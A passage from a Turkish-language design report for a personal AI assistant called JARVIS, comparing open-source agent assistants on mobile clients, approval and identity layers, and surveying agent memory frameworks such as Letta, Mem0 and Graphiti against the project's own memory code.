### 3.1 Karşılaştırma tablosu

| Proje | Repo | Yıldız | Aktif | Mimari | İstemciler | Hafıza | Kimlik/Yetki | Olgunluk |
|---|---|---|---|---|---|---|---|---|
| **QwenPaw** | `agentscope-ai/QwenPaw` (Apache-2.0, Python) | 32.959 | ✅ 100+ commit/ay | Yerel-öncelikli; Docker/ECS bulut opsiyonu (scale-to-zero yok) | Web Console, TUI, Tauri desktop (beta), 7+ IM | 3 katman: canlı context + **tam verbatim "Scroll Context"** + ReMe self-evolving Markdown KB | `governance/policy.py` (63 KB): allow/deny/ask/sandbox_fallback + SQLite `audit.db`; **kullanıcı kimliği yok** | Canlı, v2.0.1 |
| **Vellum** | `vellum-ai/vellum-assistant` (MIT, TS/Bun) | **1.006** | ✅ 100+ commit/ay | Yerel Bun + SQLite; Vellum Cloud managed runtime | Web, iOS+Android **Capacitor kabuğu**, Electron, Chrome eklentisi | 8 tip bellek iddiası, yerel ONNX embedding | `guardian` JWT + `autoApproveUpTo` risk kademesi; ayrı `credential-executor` süreci | Genç (Şub 2026); **iddia/doküman uyuşmazlıkları var** |
| **Khoj** | `khoj-ai/khoj` (AGPL-3.0, Python) | 36.202 | ⚠️ **Zayıflıyor** — 6 Tem'den beri 2 commit | Django + Postgres/pgvector | Web, Electron, Obsidian, Emacs, Android (**TWA = PWA**), WhatsApp | Döküman RAG + semantik arama | Klasik hesap/oturum; **eylem onay katmanı yok** | Olgun ama momentum kaybetmiş |
| **OpenHuman** | `tinyhumansai/openhuman` (GPL-3.0, Rust+Tauri) | 35.965 | ✅ 100+ commit/ay | Masaüstü-öncelikli; core headless JSON-RPC olarak VPS'e konabiliyor | Masaüstü + 17 IM kanalı; **mobil yok** | **Memory Tree** (SQLite'ta skorlu Markdown) + Obsidian vault aynası | Approval gate + OS-keyring + opsiyonel sandbox + Privacy Mode | Kendi ifadesiyle "early beta" |
| **Leon** | `leon-ai/leon` (MIT, TS) | 17.410 | ✅ 59 commit/ay; `develop`'ta 2.0 preview | Yerel Node.js, **çok-profilli tek server** | Socket.IO ile istemci-agnostik + **Leon Satellite** | persistent + daily + discussion + `OWNER.md`; QMD vektör | `<profile>:<token>` profil izolasyonu; HITL pause/resume | 2017'den beri; 2.0 geçiş sancısında, **tek geliştirici** |
| **PicoClaw** | `sipeed/picoclaw` (MIT, Go) | 29.814 | ⚠️ Yavaşlamış (8 commit/ay) | Tamamen yerel, tek binary, **$10 donanım** | WebUI, TUI, tepsi, **Android APK (ajan telefonda koşuyor)**, 19+ IM | JSONL memory store | `.security.yml` + hook approval | v0.2.9; repo'da **"v1.0 öncesi production'a koymayın"** uyarısı |
| **ZeroClaw** | `zeroclaw-labs/zeroclaw` (MIT/Apache, Rust) | 32.506 | ✅ 100+ commit/ay | Tek Rust binary, yerel; systemd/launchd | CLI, HTTP/WS gateway + dashboard, ACP, 30+ kanal; **mobil yok** | SQLite + embeddings | `supervised` varsayılan + Landlock/bwrap/Seatbelt/Docker + **kriptografik tool receipts** | Hızlı olgunlaşıyor; 721 açık issue |
| **Omi** | `BasedHardware/omi` (MIT, Python+Flutter) | 13.113 | ✅ günlük | **Bulut-yerli:** FastAPI + Firebase; giyilebilir + telefon | **Flutter iOS+Android (mağazalarda)**, macOS Swift, web | Konuşma hafızası, sürekli yakalama | **Speech Profile: ~90-100 sn kayıtla sesten kişi tanıma** — ama transkript etiketleme için, **yetki kapısı değil** | Ürünleşmiş |
| **LibreFang** | `librefang/librefang` (MIT, Rust) | 353 | ✅ | "Agent OS", 24 crate, zamanlanmış 7/24 ajanlar | Dashboard, Fly.io demo | — | — | Küçük ama mimari olarak ilginç |
| **Pipali** | `khoj-ai/pipali` (Apache-2.0) | 236 | ✅ | Makinede çalışan "AI iş arkadaşı" | — | — | — | Khoj ekibinin yeni yönü (Khoj'un yavaşlamasının açıklaması) |

### 3.2 Öne çıkan tekil fikirler

**QwenPaw — approve edildiğinde kuralın akıllı genelleştirilmesi.** Onaylanan kural ilk token + `*` haline getiriliyor, **ama yüksek riskli komutlar exact kalıyor.** Onay yorgunluğunu güvenliği bozmadan azaltıyor. Audit şeması: `ts / workspace / agent_id / session_id / tool / target / decision / reason / extra`, 100k kayıtta otomatik rotasyon. Ayrıca **onay kartında kararın hangi katmandan geldiği gösteriliyor** (`builtin_rules` / `user_rules` / `sensitive_paths` / `shell_evasion_checks` / `sandbox` / `No rule hit`). Kural motoru iki katmanlı: **agent'ın değiştiremediği `builtin_rules` + approve ile üretilen `user_rules`**.

**Vellum — ayrı süreçte kapsamlandırılmış credential broker.** Repo kökünde ayrı bir `credential-executor/` servisi (kendi Dockerfile'ı ile); `CredentialBroker` her credential'a `allowedTools` + `allowedDomains` kapsamı veriyor; **model plaintext secret'ı hiç görmüyor.** Sandbox **fail-closed** — kurulamazsa çalıştırmayı iptal ediyor, korumasız fallback yok.
> ⚠️ Vellum'un README'si *"actor identity (guardian, trusted, unknown) is resolved once and enforced everywhere"* diyor ama resmî güvenlik dokümanı bunun yerine **skaler risk kademesi** anlatıyor (`autoApproveUpTo: none/low/medium/high`, **kişi başına değil yürütme bağlamı başına**). Üçlü aktör rolü matrisi dokümanda yok. Ayrıca mimari dokümanı "yalnızca macOS native Swift" derken repo Electron + Capacitor gösteriyor. **Üç kaynak birbirini tutmuyor.**

**ZeroClaw — tool receipts (en özgün fikir).** Her başarılı tool çalıştırması için runtime bellekte tuttuğu efemer anahtarla `HMAC-SHA256(key, tool_name || args || result || timestamp)` hesaplayıp sonucun metnine `[receipt: zc-receipt-<ts>-<digest>]` olarak ekliyor. **Model her receipt'i görüyor ama yenisini üretemiyor — anahtar ona hiç verilmiyor.** Sonuç: model çalıştırmadığı bir tool'u çalıştırdım diyemiyor, sonucu uyduramıyor. (Sınırları dürüstçe yazılmış: bloklanan/başarısız çağrıları kapsamıyor, scope'lar arası taşınmıyor.)

**OpenHuman — loop yerine checkpoint'li graf.** Ajan turu bir yerinde durup insan onayı bekleyebiliyor, süreç ölse bile kaldığı yerden devam ediyor, ve **her koşu gerçek çağrı maliyetleriyle replay edilebiliyor**. Ayrıca TokenJuice ile tool çıktısı modele girmeden **%80'e varan sıkıştırma**; agent-to-agent iletişim Signal protokolüyle E2E şifreli.

**Leon — Satellite deseni.** Uzak sunucudaki beyin, kullanıcının cihazında koşan ince bir süreçle konuşuyor; uygun tool çağrıları o cihazda yürütülüyor ve **Satellite bağlantısı düşünce o tool'lar "unavailable" oluyor**. Tasarım kuralı: cihaza özel davranış Leon Core'a değil, **tool/skill'lere** gömülüyor. Ayrıca ajan döngüsü **32 iterasyonluk bütçeyle** koşuyor ve checkpoint'te ya kanıtla cevaplıyor ya devam izni istiyor; tool şemaları **kademeli açılıyor** (önce control tool'lar + toolkit kataloğu, sonra sadece gereken şema).

**Khoj — ajan birinci sınıf yapılandırma nesnesi.** Ajan başına özel bilgi tabanı + persona + model + tool seti.

> **Düzeltme:** PicoClaw kendini OpenClaw türevi saymıyor — README'de *"not a fork of OpenClaw, NanoBot, or any other project"* yazıyor; ilhamı HKUDS/nanobot. ZeroClaw ise repo topic'lerinde `openclaw` etiketi taşıyor.

### 3.3 JARVIS'in 4 ayırt edici özelliğini kim yapıyor?

#### (a) Kendi mobil istemcisi — ❌ **artık bize özgü değil, ve rakip güçlü**

| Kim | Ne kadar iyi |
|---|---|
| **OpenClaw** | **Tam eşleşme, hatta fazlası.** Birinci-parti native Android + iOS + **Wear OS companion**, Play Store'da yayında, GitHub Actions provenance'lı imzalı APK. Wear tarafı bizim W1 tasarımımızla neredeyse birebir: **saat kendi credential'ını saklamıyor, eşleşmiş telefonun gateway bağlantısını kullanıyor**, ajan/oturum seçimi + transkript + sesli yanıt + realtime Talk yapıyor. Android app: cihaz-üstü ASR dikte, sürekli "Talk" modu, `camera.snap`/`camera.clip`, Canvas HTML render, contacts/calendar/SMS/call-log/pedometer yüzeyleri, çift yönlü bildirim iletimi (allowlist/blocklist + sessiz saatler + rate limit) |
| **Omi** | Gerçek native Flutter iOS+Android, mağazalarda. Odak giyilebilir ses yakalama |
| **Vellum** | Zayıf: Capacitor kabuğu, kendi native kodu yok |
| **Khoj** | Android TWA (PWA sarmalayıcı); iOS yok |
| **PicoClaw** | APK var ama tersi — ajanın *kendisi* telefonda koşuyor |
| Diğerleri | Mobil istemci yok |

→ **Farkımız "mobil istemcisi olması" değil, mobil istemcinin BULUT BEYNE bağlanıyor olması.**

#### (b) Bulut-yerli / scale-to-zero — ✅ **kimse tam olarak yapmıyor**

- **Hermes** en yakın (Modal/Daytona ile terminal ortamı hibernate oluyor) — ama gateway prosesi hâlâ always-on
- **Omi** gerçek bulut backend ama scale-to-zero iddiası yok (sürekli ses akışı zaten uygun bir yük değil)
- **OpenHuman / Khoj / QwenPaw / Vellum** — hepsi always-on
- **OpenClaw / ZeroClaw / PicoClaw / Leon** — felsefe olarak reddediyorlar

→ **En net ayırt edici özelliğimiz.** Kategorinin tamamı yerel-öncelikli; bulut kullananlar bile always-on. **Cloud Run + scale-to-zero + Google ADK kombinasyonunu yapan kimse yok.**

#### (c) Sesli biyometrik kimlik — ✅ **fiilen kimse yapmıyor**

- **Omi** tek gerçek ses-biyometrisi (Speech Profile, ~90-100 sn) — **ama amacı transkript etiketleme, yetki kapısı değil.** "Bu ses Kadir değil, bu eylemi reddet" gibi bir karar noktası yok
- **OpenClaw** konuşmacı atfetme var, doğrulama yok. Güvenlik dokümanı açıkça *"biyometrik kullanılmıyor"* diyor
- **Vellum** `guardian` = bir JWT'ye sahip olmak
- Diğerlerinin hiçbirinde ses biyometrisi yok

→ **En özgün özelliğimiz. ECAPA speaker-ID'yi yetki kapısı olarak kullanan başka proje bulunamadı.**

#### (d) Eylem onay/yetki katmanı — ⚠️ **artık standart**

QwenPaw (en kapsamlısı), ZeroClaw, Vellum, OpenClaw, Hermes, OpenHuman, Leon — hepsinde bir biçimi var. Khoj ve PicoClaw zayıf.

→ **Farkımız onay katmanının varlığı değil, onun KİMLİK DOĞRULAMASINA bağlanmış olması** — yani "kim istedi" ile "ne yapılabilir"in birleşmesi. **Bu birleşimi yapan yok.**

### 3.4 ÇALINACAK fikirler

**D1 — Tool receipts (ZeroClaw).** Her başarılı araç çağrısının sonucuna efemer anahtarla `HMAC-SHA256(tool_name || args || result || timestamp)` ekle ve modele geri ver. İki kazanç: (i) asistan "Gmail'i kontrol ettim" deyip etmemiş olamaz; (ii) **audit log'daki eylem kaydı ile modelin anlattığı hikâye kriptografik olarak eşleşir.** Maliyeti bir HMAC.

**D2 — Approve → kuralı akıllı genelleştirme + karar kaynağı şeffaflığı (QwenPaw).** Onayı tek seferlik yapmak yerine kuralı otomatik genelleştir (ilk token + `*`), **ama yüksek riskli komutlarda exact eşleşmede kal.** Her onay kartında kararın hangi katmandan geldiğini göster. Matrisimiz bugün statikse, bu onu **kullanımla öğrenen** bir matrise çevirir.

**D3 — Ayrı süreçte kapsamlandırılmış credential broker (Vellum).** Credential'ları ajan sürecinden ayrı bir servise taşı; her credential'a `allowedTools` + `allowedDomains` kapsamı ver; model plaintext'i asla görmesin. **Fail-closed ol.** MCP misafir kapısı için özellikle kritik — misafir bir MCP sunucusu prompt injection ile kandırılsa bile anahtara ulaşamaz.

**D4 — Satellite deseni (Leon) — "telefon = eylem yüzeyi" hedefimize birebir.** Bulut beyni ile telefon arasına telefonda koşan ince bir satellite süreci koy. Cihazda yürütülmesi gereken tool'lar (uygulama açma, WhatsApp gönderme, kamera, konum) satellite üzerinden çağrılsın; **satellite bağlantısı düştüğünde o tool'lar model için "unavailable" olsun** — yani araç kataloğu cihazın canlılığına göre dinamik daralsın. Tasarım kuralı: cihaza özel davranış çekirdeğe değil tool/skill'lere gömülür.

**D5 — Wear/mobil güven modeli + eşleme akışı (OpenClaw).** (i) **Saat kendi credential'ını saklamasın**, eşleşmiş telefonun bağlantısını kullansın — W1 dalı için doğrudan uygulanabilir. (ii) `dmPolicy: "pairing"` + `dmScope: "per-channel-peer"` deseni **ECAPA kapısının ÖNCESİNDEKİ ucuz filtre** olur: ses doğrulaması pahalı ve gecikmeli, tanınmayan kanal kimliğini oraya kadar getirmeye gerek yok. (iii) Android bildirim iletimi tasarımı (allowlist/blocklist + sessiz saatler + rate limit) olay katmanındaki proaktiflik gürültüsü için hazır şablon.

### 3.5 Doğrulama notu

Doğrulandı: tüm yıldız/fork/lisans/tarih GitHub REST API; README'ler raw endpoint'ten okundu; QwenPaw governance/security **kaynak kodda** (`governance/{audit,policy,detectors,resource_governor,tool_registry}.py`, `security/{tool_guard,skill_scanner,secret_store}`); Vellum istemci yapısı `clients/README.md` + `credential-executor/` dizini; Khoj Android TWA (`twa-manifest.json`); ZeroClaw tool receipts ve Leon 2.0 mimarisi doküman ham içeriğinden; OpenClaw Android/Wear resmî dokümandan; Omi Speech Profile resmî yardım merkezinden.

Doğrulanamadı: QwenPaw doküman sitesi SPA ve `/docs/security` 404; Vellum'un "actor identity" iddiası; kod tabanlarının derin denetimi (mekanizmalar doküman + dosya varlığı seviyesinde doğrulandı, çalışma kalitesi test edilmedi); OpenClaw lisansı GitHub API'de `NOASSERTION` görünüyor.

**Aranıp bulunamayanlar (yokluk iddiası değil, "bulunamadı"):** ECAPA/speaker-ID'yi yetki kapısı olarak kullanan hiçbir açık kaynak kişisel asistan; Cloud Run benzeri scale-to-zero üzerine kurulmuş hiçbir tam kişisel asistan.

---

## 4. Ajan hafıza framework'leri

> Bu bölümdeki araştırma **JARVIS'in kendi kodunu da okudu** (`brain/app/memory.py`, 248 satır) — §4.6'daki eksik listesi genel eleştiri değil, bu kodun gerçek boşlukları.

### 4.1 Karşılaştırma tablosu

| Framework | Repo | Yıldız | Depo | Hafıza tipleri | Ajan kendi hafızasını düzenler mi | GCP/Firestore | Olgunluk |
|---|---|---|---|---|---|---|---|
| **Letta** (MemGPT) | letta-ai/letta, Apache-2.0 | 24.088 | SQL (PG/SQLite) + pgvector + **git repo (MemFS)** | core (block/dosya), recall, archival, skills | ✅ **En güçlüsü** — 9 memory-edit tool'u, karakter limiti, optimistic concurrency | ❌ Yok | Yüksek ama **kırılgan**: 16 Mar 2026 yön değişikliği, legacy tool'lar kaldırılıyor |
| **Mem0** | mem0ai/mem0, Apache-2.0 | **62.527** | Vektör (25+ backend) + opsiyonel graph + KV | factual, episodic, semantic; procedural (erken) | Kısmen | **Vertex AI Vector Search adaptörü var**; Firestore yok | En olgun ekosistem; 662 açık issue |
| **Zep / Graphiti** | getzep/graphiti, Apache-2.0 | 29.552 | **Sadece graf DB:** Neo4j 5.26+, FalkorDB, Neptune | temporal knowledge graph | ❌ Ajan grafı düzenlemez | ❌ Firestore imkânsız; **Cloud Run scale-to-zero ile uyumsuz** | Olgun; ama **Zep CE Nis 2025'te kapatıldı** |
| **Cognee** | topoteretes/cognee, Apache-2.0 | 29.779 | Graf + vektör hibrit | ECL: `remember/recall/improve/forget` + `memify` | ❌ ama `improve` ile feedback→edge weight | ❌ | Orta-yüksek; 1.0 çıktı |
| **LangMem** | langchain-ai/langmem, MIT | **1.596** | Depo-agnostik; LangGraph `BaseStore` şart | semantic, **episodic**, **procedural** | ✅ | ❌; LangGraph bağımlılığı ADK'lı JARVIS'e ağır | **Düşük** |
| **EverOS** | EverMind-AI/EverOS, Apache-2.0 | 11.813 | Markdown + SQLite + LanceDB, local-first | profile / episodic / **skill**; Case→Skill terfisi | Kısmen | ❌ local-first, Cloud Run stateless ile çelişir | **Düşük-orta**, beta Nis 2026 |

### 4.2 Letta — blok hafıza mekanizması (en ayrıntılı)

**Blok şeması:** `label` (benzersiz ad), `description` (**bloğun ne işe yaradığı — ajanın davranışını belirleyen asıl alan**), `value`, `limit` (karakter üst sınırı, varsayılan 2000), `read_only`. ORM'de iki kritik alan: `version` (**optimistic concurrency control**) ve `current_history_entry_id` → `BlockHistory`. Aynı blok birden fazla ajan tarafından paylaşılabiliyor (`BlocksAgents` junction).

**Context'e nasıl giriyor — doluluk oranıyla birlikte:**
```xml
<memory_blocks>
<persona><description>...</description>
  <metadata>- chars_current=128 - chars_limit=5000</metadata>
  <value>...</value></persona>
</memory_blocks>
```
> **Bu `chars_current/chars_limit` detayı tasarımın gizli kahramanı:** ajan bloğun dolmakta olduğunu **görüyor**, dolayısıyla "yer açmak için özetle" kararını kendisi verebiliyor.

**Araçlar** (kaynak: `letta/functions/function_sets/base.py`):

| Tool | Semantik |
|---|---|
| `memory_replace(label, old_string, new_string)` | **Eski string'in aynen var olduğunu doğrular; yoksa hata döner.** Tüm bloğu değiştirmeyi yasaklar |
| `memory_insert(label, new_string, insert_line=-1)` | Satır konumuna ekleme; additive olduğu için çok-ajanlı yazımda çakışmaz |
| `memory_apply_patch(label, patch)` | Unified-diff uygular |
| `memory_rethink(label, new_memory)` | Bloğu **tamamen** yeniden yazar — "son yazan kazanır", çok-ajanlıda yıkıcı |
| `memory_finish_edits()` | Düzenleme oturumunun bittiğini bildirir |
| `archival_memory_search(query, tags, tag_match_mode, top_k, start_datetime, end_datetime)` | Semantik + tag + **tarih aralığı** filtreli |
| `conversation_search(query, roles, limit, start_date, end_date)` | **Hybrid** (BM25 + semantik) |

> 🎯 **Çalınacak tasarım kararı:** `memory_replace`'in "eski metni doğrula" kuralı. Ajan halüsine bir string'i değiştirmeye kalkarsa tool hata döndürüyor ve ajan düzeltiyor. **"LLM'in blok içeriğini sessizce bozması" hatasını mekanik olarak imkânsız kılıyor — prompt'la değil, kontratla.**

**Ne zaman tetikleniyor — üç yol:**
1. **Ajanın kendi kararı (hot path).** Tetikleyici `description` alanıdır — yani **"ne zaman yaz" kuralını sistem promptuna değil, bloğun kendi tanımına yazıyorsun.**
2. **Sleep-time / dreaming (background).** `enable_sleeptime: true` ile açılan, primary agent'ın bloklarını **paylaşan** arka plan ajanı. Tetikleyiciler: yapılandırılmış sayıda kullanıcı mesajından sonra **veya context window compact edildiğinde**. Alt-ajanlar **git worktree** kullanıyor, ana ajanı bloklamadan eşzamanlı yazabiliyorlar.
3. **Kullanıcının açık emri.** `/remember always use pnpm in this repo`

**Context window yönetimi.** Token sayımı sağlayıcıya göre (`AnthropicTokenCounter`, `TiktokenCounter`, `GeminiTokenCounter`, `ApproxTokenCounter` = bytes/4 + **1.3x güvenlik çarpanı**). Taşma: `CompactionSettings.mode` = `sliding_window | all_messages | self_compact_all | self_compact_sliding_window`; varsayılan eski mesajların **%30**'unu atar; özetleme ucuz modele yönlendiriliyor.
> ⚠️ **Compaction proaktif değil, REAKTİF** — LLM çağrısı `ContextWindowExceededError` fırlattığında tetikleniyor.

**2026 kırılması — MemFS.** Bloklar artık **git destekli markdown dosya sistemine** projekte ediliyor:
```
$MEMORY_DIR/
├── system/           # her turda system prompt'a yüklenir
├── reference/        # ağaçta görünür, içeriği SADECE gerektiğinde yüklenir
└── skills/<ad>/SKILL.md
```
Her düzenleme git'e commit → sürüm geçmişi, conflict resolution, "kaydedilmiş hafıza" ile "kaydedilmemiş değişiklik" arasında net sınır. `defragmentation` skill'i hafızayı yedekleyip alt-ajanla yeniden düzenliyor: büyük dosyaları bölüyor, mükerrerleri birleştiriyor, **15-25 odaklı dosyalık** temiz hiyerarşiye indiriyor.

### 4.3 Diğerleri — her birinden alınacak tek şey

**Mem0 — yazma kapısı (write gate).** İki fazlı; asıl değer ikinci fazda. Faz 1: konuşmadan atomik olgular çıkarılır. Faz 2: çıkarılan olgular + o alandaki **mevcut** hafızalar birlikte LLM'e verilir ve `DEFAULT_UPDATE_MEMORY_PROMPT` dört operasyondan birini seçer:
```json
{"memory":[{"id":"<ID>","text":"<içerik>","event":"ADD|UPDATE|DELETE|NONE","old_memory":"<önceki>"}]}
```
Kurallar: ADD = hafızada olmayan yeni bilgi; UPDATE = var ama bilgi tamamen farklı / aynı anlam daha detaylı; DELETE = **hafızadaki bilgiyle çelişiyor**; NONE = zaten var veya alakasız.
> **Mem0'ın gerçek katkısı embedding değil, yazma kapısı: her yeni olgu, mevcut hafızayla yüzleştirilmeden yazılmıyor.**

**Graphiti — bi-temporal geçersizleştirme.** Her edge dört zaman damgası taşıyor: `valid_at` (olgunun doğru olmaya başladığı an), `invalid_at`, `created_at`, `expired_at`. **Çelişki geldiğinde eski olgu silinmiyor, invalidate ediliyor** — "şu an ne doğru" ve "o zaman ne doğruydu" ayrı sorgulanabiliyor. Maliyeti: kalıcı graf DB zorunlu → **Cloud Run scale-to-zero ekonomisini bozar.**

**Cognee — `memify`.** Bayat düğümleri buduyor, **kullanım sinyaline göre edge ağırlıklarını güncelliyor**, türetilmiş olgular ekliyor. "Kullanıldıkça keskinleşen hafıza" fikri burada somut.

**LangMem — procedural memory'yi prompt optimizasyonu olarak uyguluyor.** `create_prompt_optimizer` / `create_multi_prompt_optimizer` konuşma verisi + geri bildirimden **sistem promptunun kurallarını yeniden yazıyor.** Ayrıca hot-path (anında, gecikme ekler) vs background (sonradan, recall daha yüksek) ayrımı açıkça tanımlı. **Fikirleri al, bağımlılığı alma** (1.596 yıldız).

**EverOS — iddia doğrulaması.**
- ✅ Doğrulanan: repo gerçek (Apache-2.0, 11.813 ★), Markdown+SQLite+LanceDB local-first mimari, multimodal ingest, **Case → Skill terfisi** ("tekrar eden kazanımlar kendiliğinden yeniden kullanılabilir Skill'e terfi eder, manuel küratörlük yok"), `user_id`/`agent_id`/`app_id`/`project_id`/`session_id` ile ortogonal geri çağırma
- ❌ Çürütülen: **"en eksiksiz" iddiasının kaynağı kendi SEO blogları** — evermind.ai'nin "Best Open Source Agent Memory Frameworks 2026" yazısı yedi framework'ü sıralıyor ve **birinci sıraya kendini** koyuyor. Benchmark rakamları (LoCoMo %93,05; LongMemEval-S %83,00) **kendi bildirdiği**, üçüncü tarafça tekrarlanmamış. Public beta Nisan 2026 — üretim olgunluğu iddiası için çok yeni
- **Alınacak şey EverOS kodu değil, `Case → Skill` terfi deseni.**

### 4.4 Benchmark gerçeği — rakamlara göre framework seçmeyin

| Benchmark | Yıl | Boyut | Ölçtüğü |
|---|---|---|---|
| **LoCoMo** | 2024 | ~300 tur / 35 oturum. Token uzunluğu **tartışmalı** (Mem0: ~9.000; Zep: 16.000-26.000) | Çok oturumlu QA, olay özetleme |
| **LongMemEval** | 2024 | _S_: ~115K token / 40 oturum. _M_: ~500 oturum | 5 yetenek: bilgi çıkarma, çok-oturumlu akıl yürütme, **temporal understanding**, **knowledge update**, **abstention** |
| **BEAM** | 2026 (ICLR) | 100 konuşma, 10M token'a kadar, 2.000 soru | 10 yetenek: olgu takibi, zamansal sıralama, **çelişki çözümü**, talimat/tercih ayrımı |

**Neden güvenilmez:**
1. **Herkes kendi datasetinde lider.** Tek benchmark yayınlayan bir satıcı gördüğünüzde "neden sadece bu?" diye sorun.
2. **Zep'in Mem0 eleştirisi (6 May 2025) yöntemsel hataları belgeledi:** Mem0 konuşmadaki her iki tarafa da `user` rolü vermiş; zaman damgalarını `created_at` alanı yerine mesaj metnine eklemiş (temporal reasoning bozulmuş); aramaları paralel değil **sıralı** çalıştırıp Zep'in gecikmesini şişirmiş. Düzeltilmiş sonuç: Zep **J = %75,14 ± 0,17**, p95 arama gecikmesi **0,632 s**.
3. **LoCoMo'nun kendisi kusurlu:** Kategori 5 kullanılamaz durumda; multimodal ve konuşmacı atıf hataları; **ve knowledge update'i hiç test etmiyor** — yani JARVIS'in en çok ihtiyaç duyduğu yeteneği ölçmeyen bir benchmark.

**Satıcı iddiaları (İDDİA olarak işaretli):** Mem0 — LoCoMo %92,5, LongMemEval %94,4, BEAM-1M %64,1; Cognee — BEAM 100K'da 0,79; EverOS — LoCoMo %93,05.

> 🎯 **JARVIS için pratik sonuç: kendi regresyon setinizi kurun.** LongMemEval'in beş kategorisi (özellikle **knowledge update** ve **abstention**) Türkçeye çevrilmiş **40-60 soruluk bir set**, gerçek Firestore koleksiyonları üzerinde. Bugün hafızada hiçbir ölçüm yok; **"Arşivci aylık özetleme yaptı ve bir bilgiyi sessizce yok etti" durumunu şu anda hiçbir şey yakalayamaz.**

### 4.5 Procedural memory ve "ders defteri" desenleri

**Tarife deseni kimde var:**
- **Letta Skills** (en olgun): `skills/<ad>/SKILL.md`, hafızayla birlikte versiyonlanıyor. **Kritik: skill dosyaları `system/` altında DEĞİL** — hafıza ağacında görünüyorlar, içerikleri sadece ilgili olduğunda yükleniyor. "50 tarif yazdım, hepsi promptumu şişiriyor" problemini yapısal olarak çözüyor.
- **EverOS Case → Skill:** her görev bir **Case** (trajectory kaydı) olarak yakalanıyor; **tekrar eden kazanımlar kendiliğinden Skill'e terfi ediyor.** "Tekrar" kriteri terfi eşiği — **tek başarılı çalıştırma tarif üretmiyor.**
- **Akademik — AWM (Agent Workflow Memory):** başarılı trajectory'lerden **soyutlanmış eylem şablonları** çıkarır. "Ham log sakla" ile "soyut tarif sakla" farkı burada — **ham trajectory saklamak işe yaramıyor.**

> ⚠️ **JARVIS uyarısı:** proje belgesinde "tarifler" var ama `brain/app/memory.py`'de **`recipes` koleksiyonu YOK** — kod sadece `profile`, `facts`, `lessons`, `sessions`, `audit_log` tutuyor. **Tarif katmanı tasarımda var, üretimde yok.**

**Hatadan öğrenme — dürüst cevap: hiçbir üretim framework'ünde tam yok.** Mem0 olguları günceller, Graphiti çelişkileri invalidate eder, Cognee edge ağırlıklarını ayarlar — ama *"şu hatayı yaptım, sebebi buydu, bir daha yapmayacağım"* şeklinde **birinci sınıf bir ders nesnesi hiçbirinde yok. JARVIS'in `add_lesson(context, tried, went_wrong, correct)` şeması bu anlamda çoğu framework'ten DAHA İLERİDE.**

Desen araştırmada, ikisi doğrudan uygulanabilir:

**ACE — Agentic Context Engineering** (arXiv 2510.04618, ICLR 2026, Stanford/SambaNova). Bağlamı **evrilen bir playbook** olarak ele alıyor, üç rol:
- **Generator**: mevcut playbook'la görevi yapar
- **Reflector**: yürütme geri bildirimini bir **derse** çevirir (özet değil, spesifik ve yeniden kullanılabilir içgörü)
- **Curator**: küçük, yapılandırılmış **delta güncellemeler** üretir — "şu maddeyi ekle", "şu stratejinin sayacını artır", "şunu deprecated işaretle"

Çözdüğü iki hastalık **Arşivci'mizi doğrudan ilgilendiriyor**: **brevity bias** (özetleme uğruna alan bilgisinin atılması) ve **context collapse** (tekrarlı yeniden yazımın detayı aşındırması). Kazanç: ajan benchmark'larında **+%10,6**, finansta **+%8,6**, etiketli denetim olmadan.
> **Delta-update kuralı, "aylık özetle" yaklaşımının tam alternatifi: hafızayı YENİDEN YAZMA, ÜSTÜNE YAZ.**

**ReasoningBank** (arXiv 2509.25140, Google). **Hem başarılı hem başarısız** deneyimlerden genelleştirilebilir stratejiler damıtıyor. Gözlemlenen davranış: strateji maddeleri zamanla **evriliyor**, sabit kalmıyor.

> İlkemiz ("aynı hatanın ikinci kez yapılması tasarım hatasıdır") literatürdeki bu iki çizginin tam üstünde. **Eksik olan ilke değil, döngünün kapanması:** ders yazılıyor ama (a) görev başında proaktif enjekte edilmiyor, (b) "bu ders işe yaradı mı" sayacı yok, (c) deprecated işaretleme yok.

### 4.6 JARVIS'in mevcut hafıza tasarımının EKSİKLERİ

`brain/app/memory.py` (248 satır) okunarak çıkarılmış **gerçek** boşluklar:

1. **Yazma kapısı yok.** `remember_fact(fact)` gelen metni doğrudan `facts` koleksiyonuna ekliyor. Mem0'ın ADD/UPDATE/DELETE/NONE adımının karşılığı yok → aynı olgu farklı cümlelerle defalarca yazılır, **çelişen iki olgu yan yana yaşar** ve arama ikisini birden döndürür. **Tek kullanıcılı bir asistanda bu, birkaç ay içinde kesin bozulmaya götürür.**
2. **Zaman boyutu yok.** Kayıtlarda sadece `ts` (yazılma anı); `valid_at` / `invalid_at` / `superseded_by` yok. "Kadir S23 kullanıyor" → telefon değişti → eski olgu hâlâ geri geliyor. **Çözmek için graf DB gerekmiyor — üç alan yetiyor.**
3. **Ajan kendi hafızasını düzenleyemiyor.** `profile` koda ait (`update_profile(patch)`), ajana ait değil. Ajan "bunu kalıcı bilgi yapayım" diyemiyor.
4. **Ders defteri pasif.** `add_lesson` var (iyi, çoğu framework'ten ileride) — ama dersler yalnızca `search_memory` sorgusu tesadüfen eşleşirse geri geliyor. **Görev başında proaktif enjeksiyon yok.** "Aynı hatayı iki kez yapma" garantisi, dersin doğru anda context'te olmasına bağlı; **şu anda o garanti yok.** Ayrıca işe yarayıp yaramadığını ölçen sayaç, deprecated işaretleme ve delta güncelleme yok.
5. **`recipes` koleksiyonu kodda yok.** Procedural memory katmanı sıfır.
6. **Arama yüzeyi dar ve provenance kaybediyor.** `_search_semantic_native` yalnızca `facts` + `lessons` üzerinde — `profile` ve `sessions` semantik aramaya hiç girmiyor. Dahası dönen sonuç `" ".join(str(v) for k,v in data.items())` yani **doküman id'si, zaman damgası ve kaynak alan adları eriyip düz metne dönüşüyor.** Bu yüzden "bunu unut", "şunu düzelt", "bu bilgiyi nereden biliyorsun" için tutamak kalmıyor.
7. **Context window kontratı yok.** Kademe 1 tamamen ADK'nın davranışına bırakılmış; token muhasebesi, compaction eşiği, özetin nereye yerleşeceği tanımlı değil.
8. **Arşivci ölçülmüyor.** Aylık/3-aylık özetleme brevity bias + context collapse riskini taşıyor. **Özetleme sonrası bir bilginin kaybolduğunu hiçbir test yakalayamaz. Hafıza sisteminin en tehlikeli tek noktası bu.**
9. **Hafıza için regresyon seti yok.** `brain/tests/test_memory.py` mekanizmayı test ediyor (merge, cosine, embedding takma) — **recall kalitesini değil.**
10. **Embedding operasyonel yük.** e5-base her instance'da **~1,1 GB**; scale-to-zero ile her soğuk başlangıçta bedel ödeniyor (kodun kendi yorumu bunu zaten itiraf ediyor: ağırlık yüklemesi ilk embed'e erteleniyor).

### 4.7 Türkçe embedding — multilingual-e5-base hâlâ makul mü?

